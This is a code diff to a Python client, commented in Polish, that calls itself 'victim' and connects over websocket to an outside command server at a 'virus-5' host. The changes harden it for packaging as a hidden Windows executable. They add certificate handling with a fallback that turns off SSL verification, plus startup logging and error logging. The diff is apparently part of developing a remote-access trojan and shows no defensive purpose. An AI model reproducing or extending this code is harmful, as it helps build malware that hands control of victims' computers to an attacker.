@@ -6,9 +6,8 @@ import subprocess
 import platform
 import tempfile
 import threading
-import select
 import sys
-import io
+import ssl
 import logging
 
 # ─── Logowanie do pliku (widoczne nawet jak victim jest ukryty) ───
@@ -24,9 +23,28 @@ log = logging.getLogger("victim")
 try:
     from websocket import create_connection, WebSocketConnectionClosedException
 except ImportError:
-    print("Brak biblioteki websocket-client. Instaluję...")
-    os.system("pip install websocket-client")
-    from websocket import create_connection, WebSocketConnectionClosedException
+    log.critical("Brak biblioteki websocket-client! Nie można kontynuować.")
+    sys.exit(1)
+
+
+def get_ssl_options():
+    """Zwraca opcje SSL — obsługuje PyInstaller (brak certyfikatów w EXE)."""
+    try:
+        import certifi
+        log.info(f"Używam certyfikatów z certifi: {certifi.where()}")
+        return {"ca_certs": certifi.where(), "cert_reqs": ssl.CERT_REQUIRED}
+    except ImportError:
+        pass
+
+    # Fallback: spróbuj systemowych certów
+    default_ca = ssl.get_default_verify_paths().cafile
+    if default_ca and os.path.isfile(default_ca):
+        log.info(f"Używam systemowych certyfikatów: {default_ca}")
+        return {"ca_certs": default_ca, "cert_reqs": ssl.CERT_REQUIRED}
+
+    # Ostateczność: wyłącz weryfikację SSL (EXE bez certów)
+    log.warning("Brak certyfikatów SSL — wyłączam weryfikację!")
+    return {"cert_reqs": ssl.CERT_NONE}
 
 # ─── Konfiguracja ───────────────────────────────────────────────
 SERVER_URL = "wss://virus-5.onrender.com/victim"
@@ -272,7 +290,8 @@ def connect_loop():
         try:
             log.info(f"Łączenie z {url} ...")
             print(f"[*] Łączenie z {url} ...")
-            ws = create_connection(url, timeout=30)
+            ssl_opt = get_ssl_options()
+            ws = create_connection(url, timeout=30, sslopt=ssl_opt)
             log.info(f"Połączono jako '{VICTIM_ID}'")
             print(f"[+] Połączono jako '{VICTIM_ID}'")
 
@@ -341,4 +360,9 @@ def connect_loop():
 
 
 if __name__ == "__main__":
-    connect_loop()
+    try:
+        log.info(f"=== Victim start === frozen={getattr(sys, 'frozen', False)} exe={sys.executable}")
+        connect_loop()
+    except Exception as e:
+        log.critical(f"FATAL: {e}", exc_info=True)
+        raise
